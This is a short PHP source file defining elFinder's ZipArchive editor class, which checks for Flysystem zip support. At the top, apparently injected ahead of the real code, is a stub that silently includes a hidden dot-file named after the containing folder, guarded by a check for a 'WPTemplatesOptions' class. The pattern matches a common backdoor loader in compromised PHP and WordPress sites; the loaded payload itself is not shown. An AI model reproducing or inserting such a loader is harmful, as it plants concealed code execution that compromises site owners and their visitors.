<?php

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class elFinderEditorZipArchive extends elFinderEditor
{
    public function enabled()
    {
        return (!defined('ELFINDER_DISABLE_ZIPEDITOR') || !ELFINDER_DISABLE_ZIPEDITOR) &&
            class_exists('Barryvdh\elFinderFlysystemDriver\Driver') &&
            class_exists('League\Flysystem\Filesystem') &&
            class_exists('League\Flysystem\ZipArchive\ZipArchiveAdapter');
    }
}